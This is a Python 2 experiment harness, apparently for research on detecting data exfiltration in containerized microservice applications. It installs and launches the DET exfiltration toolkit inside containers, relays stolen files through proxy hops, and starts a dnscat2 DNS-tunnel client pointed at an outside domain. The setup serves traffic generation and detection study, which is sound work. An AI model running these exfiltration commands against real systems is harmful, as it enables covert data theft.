def find_corresponding_pod_attribs(cur_container_name):
    client = docker.from_env()
    # note: this parsing works for wordpress, might not work for others if structure of name is different
    print "cur_container_name", cur_container_name
    part_of_name_shared_by_container_and_pod = '_'.join('-'.join(cur_container_name.split('-')[3:]).split('_')[:-1])
    print "part_of_name_shared_by_container_and_pod", part_of_name_shared_by_container_and_pod        
    for container in client.containers.list():
        # print "containers", network.containers
        #print "part_of_name_shared_by_container_and_pod", part_of_name_shared_by_container_and_pod
        if part_of_name_shared_by_container_and_pod in container.name and 'POD' in container.name:
            print "found container", container.name
            return container.attrs

def parse_cilium(config):
    mapping = {}
    for pod_config in config:
        pod_name = pod_config['status']['external-identifiers']['pod-name']
        ipv4_addr = pod_config['status']['networking']['addressing'][0]['ipv4']
        ipv6_addr = pod_config['status']['networking']['addressing'][0]['ipv6']
        mapping[ipv4_addr] = (pod_name, 'cilium')
        mapping[ipv6_addr] = (pod_name, 'cilium')
    return mapping
    
def install_det_dependencies(orchestrator, container, installer):
    #if orchestrator == 'kubernetes':
    #    ## todo
    #    pass
    if orchestrator == "docker_swarm" or orchestrator == 'kubernetes':
        # okay, so want to read in the relevant bash script
        # make a list of lists, where each list is a line
        # and then send each to the container
        #''' # Note: this is only needed for Atsea Shop
        upload_config_command = ["docker", "cp", "./exp_support_scripts/modify_resolve_conf.sh", container.id+ ":/modify_resolv.sh"]
        out = subprocess.check_output(upload_config_command)
        print "upload_config_command", upload_config_command, out

        out = container.exec_run(['sh', '//modify_resolv.sh'], stream=True, user="root")
        print out
        #'''

        if installer == 'apk':
            filename = './install_scripts/apk_det_dependencies.sh'
        elif installer =='apt':
            filename = './install_scripts/apt_det_dependencies.sh'
        elif installer == 'tce-load':
            filename = './install_scripts/tce_load_det_dependencies.sh'
        else:
            print "unrecognized installer, cannot install DET dependencies.."
            filename = ''

        with open(filename, 'r') as fp:
            read_lines = fp.readlines()
            read_lines = [line.rstrip('\n') for line in read_lines]

        for command_string in read_lines:
            command_list = command_string.split(' ')
            print container.name
            print "command string", command_string
            print "command list", command_list
            # problem: doesn't run as root...
            out = container.exec_run(command_list, stream=True, user="root")
            print "response from command string:"
            for output in out.output:
                print output
            print "\n"
    else:
        pass


def map_network_ids_to_namespaces(orchestrator, full_network_ids):
    print "map_network_ids_to_namespaces", orchestrator, full_network_ids
    network_ids_to_namespaces = {}
    if orchestrator == 'kubernetes':
	print "map_network_ids_to_namespaces in k8s part"
        network_ids_to_namespaces = {}
        for full_id in full_network_ids:
	    print "full_id", full_id
            if full_id == 'bridge':
                network_ids_to_namespaces['bridge'] = 'default'
        return network_ids_to_namespaces
    elif orchestrator == "docker_swarm":
        # okay, so this is what we need to do
        # (1) get the network namespaces on the vm
        # (2) search for part of the network ids in the namespace

        # (1)
        #
        args = ['docker-machine', 'ssh', 'default', '-t', "sudo ls /var/run/docker/netns"]
        print "let's get some network namespaces...", args
        out = subprocess.check_output(args)
        print "single string network namespaces", out
        network_namespaces = re.split('  |\n', out) #out.split(' ')
        # todo: remove \x1b[0;0m from front
        # todo; remove \x1b[0m from end
        # note: this isn't foolproof, sometimes the string stays distorted
        print type(network_namespaces[0])
        #processed_network_namespaces = network_namespaces
        processed_network_namespaces = [i.replace('\x1b[0;0m', '').replace('\x1b[0m', '') for i in network_namespaces]
        print "semi-processed network namespaces:", processed_network_namespaces

        # (2)
        for network_namespace in processed_network_namespaces:
            if '1-' in network_namespace: # only looking at overlay networks
                for network_id in full_network_ids:
                    if network_namespace[2:] in network_id:
                        network_ids_to_namespaces[network_id] = network_namespace
                        break

        for full_id in full_network_ids:
            if full_id == "bridge":
                network_ids_to_namespaces[full_id] =  "bridge"
            if full_id == 'ingress_sbox':
                network_ids_to_namespaces[full_id] =  "ingress_sbox"

        #print "network_ids_to_namespaces", network_ids_to_namespaces
        return network_ids_to_namespaces
    else:
        pass


# note: det must be a single ip, in string form, ATM
def start_det_proxy_mode(orchestrator, container, srcs, dst, protocol, maxsleep, maxbytesread, minbytesread):
    network_ids_to_namespaces = {}
    if orchestrator == "docker_swarm" or orchestrator == 'kubernetes':
        # okay, so this is what we need to do here
        # (0) create a new config file
            # probably want to use sed (#coreutilsonly)
        # (1) upload the new configuration file to the container
            # use 'docker cp' shell command
        # (2) send a command to start DET
            # just use container.exec_run, it's a one liner, so no big deal
        # going to do a bit of a workaround below, since using pipes with the subprocesses
        # module is tricky, so let's make a copy of the file we want to modify and then we
        # can just modify it in place
        cp_command = ['cp', './exp_support_scripts/det_config_template.json', './current_det_config.json']
        out = subprocess.check_output(cp_command)
        print "cp command result", out

        targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
        print srcs[0], srcs
        src_string = ""
        for src in srcs[:-1]:
            src_string += "\\\"" + src +  "\\\"" + ','
        src_string += "\\\"" + srcs[-1] +  "\\\""
        proxiesip_switch = "s/PROXIESIP/" + "[" + src_string  + "]" + "/"
        print "targetip_switch", targetip_switch
        print "proxiesip_switch", proxiesip_switch
        maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
        maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
        minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
        sed_command = ["sed", "-i", "-e",  targetip_switch, "-e", proxiesip_switch, "-e", maxsleeptime_switch,
                       "-e", maxbytesread_switch, "-e", minbytesread_switch, "./current_det_config.json"]
        print "sed_command", sed_command
        out = subprocess.check_output(sed_command)
        print "sed command result", out

        upload_config_command = ["docker", "cp", "./current_det_config.json", container.id+ ":/config.json"]
        out = subprocess.check_output(upload_config_command)
        print "upload_config_command", upload_config_command
        print "upload_config_command result", out

        time.sleep(1)
        start_det_command = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-Z"]
        print "start_det_command", start_det_command

        # stdout=False b/c hangs otherwise
        try:
            container.exec_run(start_det_command, user="root", workdir='/DET',stdout=False, detach=True)
            #print "response from DET proxy start command:"
            #print out
        except:
            print "start det proxy command is hanging, going to hope it is okay and just keep going"
        #for output in out.output:
        #    print output
        #print "\n"

    else:
        pass


def start_det_server_local(protocol, srcs, maxsleep, maxbytesread, minbytesread, experiment_name):
    # okay, need to modify this so that it can work (can use the working version above as a template)
    #'''
    cp_command = ['sudo', 'cp', "./exp_support_scripts/det_config_local_template.json", "/DET/det_config_local_configured.json"]
    out = subprocess.check_output(cp_command)
    print "cp command result", out

    # todo: switch this for 1-n and n-n
    #proxiesip_switch = "s/PROXIESIP/" + "[\\\"" + srcs[0] + "\\\"]" + "/"
    src_string = ""
    for src in srcs[:-1]:
        src_string += "\\\"" + src +  "\\\"" + ','
    src_string += "\\\"" + srcs[-1] +  "\\\""
    proxiesip_switch = "s/PROXIESIP/" + "[" + src_string  + "]" + "/"

    maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
    maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
    minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
    sed_command = ["sudo", "sed", "-i", "-e", proxiesip_switch, "-e", maxsleeptime_switch, "-e", maxbytesread_switch,
                   "-e", minbytesread_switch,"/DET/det_config_local_configured.json"]
    print "proxiesip_switch", proxiesip_switch
    print "sed_command", sed_command
    out = subprocess.check_output(sed_command)
    print out
    # note: don't have to move anything b/c the file is already local
    #out = subprocess.check_output(['pwd'])
    #print out
    #'''
    cmds = ["sudo", "python", "/DET/det.py", "-L" ,"-c", "/DET/det_config_local_configured.json", "-p", protocol]
    #out = subprocess.Popen(cmds, cwd='/DET/')
    print "commands to start DET", cmds
    # okay, I am going to want to actually parse the results so I can see how often the data arrives
    # which will allow me to find the actual rate of exfiltration, b/c I think DET might be rather
    # slow...
    # removed: stdout=subprocess.PIPE,
    # note: this will remove the files existing contents (which is fine w/ me!)
    with open('./' + experiment_name + '_det_server_local_output.txt', 'w') as f:
        cmd = subprocess.Popen(cmds, cwd='/DET/', preexec_fn=os.setsid, stdout=f)

def parse_local_det_output(exfil_info_file_name, protocol):
    print "this is the local det server parsing function!"
    total_bytes = 0
    first_time = None
    last_time = None
    with open(exfil_info_file_name, 'r') as f:
        for line in f.readlines():
            #print "before recieved", line
            if "Received" in line and protocol in line:
                #print '\n'
                #print "after recieved", line.replace('\n','')
                matchObj = re.search(r'(.*)Received(.*)bytes(.*)', line)
                #print matchObj.group()
                bytes_recieved = int(matchObj.group(2))
                total_bytes += bytes_recieved
                #print "bytes recieved...", bytes_recieved
                #print "total bytes...", total_bytes
                # okay, let's find some times...
                matchObjTime = re.search(r'\[(.*)\](.*)\](.*)', line)
                #print "time..", matchObjTime.group(1)
                if not first_time:
                    first_time = matchObjTime.group(1)
                last_time = matchObjTime.group(1)

    return total_bytes, first_time, last_time

def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_exfil, maxsleep, minbytesread, maxbytesread):
    # note: don't want to actually start the client yet, however
    out = subprocess.check_output(['pwd'])
    print out

    cp_command = ['cp', './exp_support_scripts/det_config_client_template.json', './det_config_client.json']
    out = subprocess.check_output(cp_command)
    print "cp command result", out

    print 'dst', dst
    targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
    print "targetip_switch", targetip_switch
    maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
    maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
    minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
    sed_command = ["sed", "-i", "-e", targetip_switch, "-e", maxsleeptime_switch, "-e", maxbytesread_switch, "-e",
                   minbytesread_switch, "./det_config_client.json"]
    print "sed_command", sed_command
    out = subprocess.check_output(sed_command)
    print "sed command result", out

    upload_config_command = ["docker", "cp", "./det_config_client.json", container.id + ":/config.json"]
    out = subprocess.check_output(upload_config_command)
    print "upload_config_command", upload_config_command
    print "upload_config_command result", out

    # i also want to move ./exp_support_scripts/loop.py here (so that I can call it easily later on)
    upload_loop_command = ["docker", "cp", "./exp_support_scripts/loop.py", container.id + ":/DET/loop.py"]
    out = subprocess.check_output(upload_loop_command)
    print "upload_loop_command", upload_loop_command
    print "upload_loop_command result", out

    find_file_to_exfil = "find " + directory_to_exfil + " -name " + regex_to_exfil
    print "find_file_to_exfil", find_file_to_exfil
    file_to_exfil = container.exec_run(find_file_to_exfil, user="root", stdout=True, tty=True)
    print "file_to_exfil", file_to_exfil, file_to_exfil.output, "end file to exfil"
    file_to_exfil = file_to_exfil.output.split('\n')[0].replace("\n", "").replace("\r", "")
    print "start file to exfil", file_to_exfil, "end file to exfil"
    #print next( file_to_exfil.output )
    return file_to_exfil

def start_dnscat_client(container):
    cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
    print "start dns exfil commands", str(cmds)
    out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
    print "dnscat client output output"

def stop_dnscat_client(container):
    cmds = ["pkill", "dnscat"]
    out = container.exec_run(cmds, user="root", stream=True)
    print "stop dnscat client output: "#, out
    #print "response from command string:"
    for output in out.output:
        print output

def start_det_client(file, protocol, container):
    cmds = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-f", file]
    print "start det client commands", str(cmds)
    print "start det client commands", str(cmds)[1:-1]
    arg_string = ''
    for cmd in cmds:
        arg_string += cmd + ' '
        print arg_string
    arg_string = arg_string[:-1]
    loopy_cmds = ["python", "/DET/loop.py", protocol, file]
    print "loopy_cmds", loopy_cmds
    out = container.exec_run(loopy_cmds, user="root", workdir='/DET', stdout=False)
    #out = container.exec_run(cmds, user="root", workdir='/DET', stdout=False)
    print "start det client output", out

def stop_det_client(container):
    ## let's just kill all python processes, that'll be easier than trying to record PIDs, or anything else
    cmds = ["pkill", "-9", "python"]
    out =container.exec_run(cmds, user="root", stream=True)
    print "stop det client output: "#, out
    #print "response from command string:"
    for output in out.output:
        print output

def find_dst_and_srcs_ips_for_det(exfil_path, current_class_name, selected_containers, localhostip,
                                  proxy_instance_to_networks_to_ip, class_to_networks):
    current_loc_in_exfil_path = exfil_path.index(current_class_name)
    current_class_networks = class_to_networks[current_class_name] #proxy_instance_to_networks_to_ip[current_class_name].keys()

    if current_class_name not in exfil_path:
        return None, None

    # at originator -> no srcs (or rather, it is the exp_support_scripts for itself):
    print current_class_name, current_loc_in_exfil_path+1, len(exfil_path)
    if current_loc_in_exfil_path+1 == len(exfil_path):
        srcs = None
        pass
    else: # then it has srcs other than itself
        prev_class_in_path = exfil_path[current_loc_in_exfil_path + 1]
        print selected_containers
        # iterate through selected_containers[prev_class_in_path] and append the IP's (seems easy but must wait until done w/ experiments)
        srcs = []
        # containers must be on same network to communicate...
        prev_class_networks = class_to_networks[prev_class_in_path]
        prev_and_current_class_network = list( set(current_class_networks) & set(prev_class_networks))[0] # should be precisely one
        for prev_instance in selected_containers[prev_class_in_path]:
            print 'nneettss', prev_instance,selected_containers[current_class_name]
            print current_class_name, current_class_networks
            print prev_class_in_path, prev_class_networks

            # now retrieve the previous container's IP for the correct network
            print "finding previous ip in exfiltration path...", proxy_instance_to_networks_to_ip[prev_instance], prev_instance.name
            print prev_and_current_class_network.name, [i.name for i in proxy_instance_to_networks_to_ip[prev_instance]]
            prev_instance_ip = proxy_instance_to_networks_to_ip[prev_instance][prev_and_current_class_network]
            srcs.append(prev_instance_ip)

    # at last microservice hop -> next dest is local host
    if current_loc_in_exfil_path == 0:
        next_instance_ip = localhostip
        dests = [next_instance_ip]
    else: # then it'll hop through another microservice
        # then can just pass to another proxy in the exfiltration path

        # going to want to do the same tpye of thing (follow the example of the code above)
        next_class_in_path = exfil_path[current_loc_in_exfil_path - 1]
        next_class_networks = class_to_networks[next_class_in_path]
        next_and_current_class_network = list(set(current_class_networks) & set(next_class_networks))[0]  # should be precisly one 
        dests = []
        for next_instance in selected_containers[next_class_in_path]:
            print "next_and_current_class_network", next_and_current_class_network
            next_instance_ip = proxy_instance_to_networks_to_ip[next_instance][next_and_current_class_network]
            dests.append(next_instance_ip)

    return dests, srcs

# note, requests means requests that succeeded
def sanity_check_locust_performance(locust_csv_file):
    method_to_requests = {}
    method_to_fails = {}
    with open(locust_csv_file, 'r') as locust_csv:
        reader = csv.reader(locust_csv)
        for row in reader:
            try: # then it is a line with data
                int(row[2])
                #print "real vals", row
            except: # then it is a line w/ just the names of the columns
                #print "header", row
                continue
            if row[0] == "None":
                method_to_requests[(row[0], row[1])] = row[2]
                method_to_fails[(row[0], row[1])] = row[3]
    total_requests = 0
    total_fails = 0
    for method in method_to_requests.keys():
        total_requests += int(method_to_requests[method])
        total_fails += int(method_to_fails[method])
    try:
        fail_percentage = float(total_fails) / float(total_requests + total_fails)
    except ZeroDivisionError:
        fail_percentage = 0
    return total_requests, total_fails, fail_percentage

# note: this function exists b/c there are lots of staments scattered around that print stuff to current
# directory, and I want to move all of that info into the experimental folder. Probably easiest just to check
# if the experiment name is in the file name and then move it accordingly
def copy_experimental_info_to_experimental_folder(exp_name):
    for filename in os.listdir('./'):
        print "found_filename", filename, "    ", "exp_name", exp_name, exp_name in filename
        if exp_name in filename:
            print "exp_name_in_filename", filename
            if 'creation_log' in filename or 'json' in filename or 'pcap' in filename:
                shutil.move("./"+filename, './experimental_data/' + exp_name + '/' + filename)
            else:
                shutil.move("./"+filename, './experimental_data/' + exp_name + '/debug/' + filename)

# def generate_analysis_json ??? -> ??
# this function generates the json that will be used be the analysis_pipeline pipeline
def generate_analysis_json(path_to_exp_folder, analysis_json_name, exp_config_json, exp_name):
    # okay, so what I want is just a dict with the relevant values...

    analysis_dict = {}

    analysis_dict["application_name"] = exp_config_json["application_name"]
    analysis_dict["experiment_name"] = exp_config_json["experiment_name"]
    analysis_dict["experiment_length_sec"] = exp_config_json["experiment_length_sec"]
    analysis_dict["network_plugin"] = exp_config_json["network_plugin"]

    try:
        analysis_dict["setup"] = {}
        analysis_dict["setup"]["number_customer_records"] = exp_config_json["setup"]["number_customer_records"]
        analysis_dict["setup"]["number_background_locusts"] = exp_config_json["setup"]["number_background_locusts"]
        analysis_dict["setup"]["background_locust_spawn_rate"] = exp_config_json["setup"]["background_locust_spawn_rate"]
    except: # some of the setups handle app seteup seperately
        pass

    analysis_dict["experiment"] = {}
    analysis_dict["experiment"]["number_background_locusts"] = exp_config_json["experiment"]["number_background_locusts"]
    analysis_dict["experiment"]["background_locust_spawn_rate"] = exp_config_json["experiment"]["background_locust_spawn_rate"]
    analysis_dict["experiment"]["traffic_type"] = exp_config_json["experiment"]["traffic_type"]

    analysis_dict["exfiltration_info"] = {}
    analysis_dict["exfiltration_info"]["sensitive_ms"] = exp_config_json["exfiltration_info"]["sensitive_ms"]
    analysis_dict["exfiltration_info"]["exfiltration_path_class_which_installer"] = exp_config_json["exfiltration_info"]["exfiltration_path_class_which_installer"]
    analysis_dict["exfiltration_info"]["exfil_paths"] = exp_config_json["exfiltration_info"]["exfil_paths"]
    analysis_dict["exfiltration_info"]["folder_to_exfil"] = exp_config_json["exfiltration_info"]["folder_to_exfil"]
    analysis_dict["exfiltration_info"]["regex_of_file_to_exfil"] = exp_config_json["exfiltration_info"]["regex_of_file_to_exfil"]
    analysis_dict["exfiltration_info"]["exfil_methods"] = exp_config_json["exfiltration_info"]["exfil_methods"]
    analysis_dict["exfiltration_info"]["exfil_protocols"] = exp_config_json["exfiltration_info"]["exfil_protocols"]
    analysis_dict["exfiltration_info"]["exfil_StartEnd_times"] = exp_config_json["exfiltration_info"]["exfil_StartEnd_times"]
    analysis_dict["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"] = exp_config_json["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"]
    analysis_dict["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"] = exp_config_json["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"]
    analysis_dict["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"] = exp_config_json["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"]
    analysis_dict["exfiltration_info"]["sec_between_exfil_pkts"] = exp_config_json["exfiltration_info"]["sec_between_exfil_pkts"]

    analysis_dict["pod_creation_log_name"] = exp_name  + '_cluster_creation_log.txt'
    analysis_dict["pcap_file_name"] = exp_name + '_default_bridge_0any.pcap'

    analysis_dict['exfiltration_info']['sec_between_exfil_pkts'] = exp_config_json["exfiltration_info"]["sec_between_exfil_pkts"]


    json_path = path_to_exp_folder + analysis_json_name
    r = json.dumps(analysis_dict, indent=4)
    with open(json_path, 'w') as f:
        f.write(r + "\n" )

def setup_directories(exp_name):
    # first want an ./experimental_data directory
    try:
        os.makedirs('./experimental_data')
    except OSError:
        if not os.path.isdir('./experimental_data'):
            raise

    # then want the directory to store the results of this experiment in
    # but if it already exists, we'd want to delete it, so that we don't get
    # overlapping results confused
    if os.path.isdir('./experimental_data/' + exp_name):
        shutil.rmtree('./experimental_data/' + exp_name)
    os.makedirs('./experimental_data/'+exp_name)
    os.makedirs('./experimental_data/'+exp_name+'/edgefiles/')
    os.makedirs('./experimental_data/'+exp_name+'/graphs/')
    os.makedirs('./experimental_data/'+exp_name+'/alerts')
    os.makedirs('./experimental_data/'+exp_name+'/debug')
    print "Just setup directories!"

if __name__=="__main__":
    print "RUNNING"

    parser = argparse.ArgumentParser(description='Creates microservice-architecture application pcaps')

    parser.add_argument('--exp_name',dest="exp_name", default=None)
    parser.add_argument('--config_file',dest="config_file", default='configFile')
    parser.add_argument('--prepare_app_p', dest='prepare_app_p', action='store_true',
                        default=False,
                        help='sets up the application (i.e. loads db, etc.)')
    parser.add_argument('--install_det_depen', dest='install_det_depen_p', action='store_true',
                        default=False,
                        help='install DET dependencies on the relevant containers?')
    parser.add_argument('--port',dest="port_number", default='80')
    parser.add_argument('--ip',dest="vm_ip", default='None')
    parser.add_argument('--docker_daemon_port',dest="docker_daemon_port", default='2376')
    parser.add_argument('--no_exfil', dest='exfil_p', action='store_false',
                        default=True,
                        help='do NOT perform exfiltration (default is to perform it)')

    #  localhost communicates w/ vm over vboxnet0 ifconfig interface, apparently, so use the
    # address there as the response address, in this case it seems to default to the below
    # value, but that might change at somepoints
    parser.add_argument('--localhostip',dest="localhostip", default="192.168.99.1")

    args = parser.parse_args()
    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip, args.install_det_depen_p, args.exfil_p

    print os.getcwd()
    with open(args.config_file) as f:
        config_params = json.load(f)
    orchestrator = "kubernetes"

    if args.vm_ip == 'None':
        ip = get_IP(orchestrator)
    else:
        ip = args.vm_ip

    # need to setup some environmental variables so that the docker python api will interact with
    # the docker daemon on the docker machine
    docker_host_url = "tcp://" + ip + ":" + args.docker_daemon_port
    print "docker_host_url", docker_host_url
    os.environ['DOCKER_HOST'] = docker_host_url
    os.environ['DOCKER_TLS_VERIFY'] = "1"

    if args.exp_name:
        setup_directories(args.exp_name)
        exp_name = args.exp_name
    else:
        with open(args.config_file) as f:
            config_params = json.load(f)
            setup_directories(config_params['experiment_name'])
            exp_name = config_params['experiment_name']

    path_to_docker_machine_tls_certs = ''
    with open(args.config_file) as f:
        config_params = json.load(f)
        generate_analysis_json('./experimental_data/' + exp_name + '/', exp_name + '_analysis.json', config_params, exp_name)
        path_to_docker_machine_tls_certs = config_params["path_to_docker_machine_tls_certs"]

    print "path_to_docker_machine_tls_certs", path_to_docker_machine_tls_certs
    os.environ['DOCKER_CERT_PATH'] = path_to_docker_machine_tls_certs
    client =docker.from_env()

    main(exp_name, args.config_file, args.prepare_app_p, int(args.port_number), ip, args.localhostip, args.install_det_depen_p, args.exfil_p)
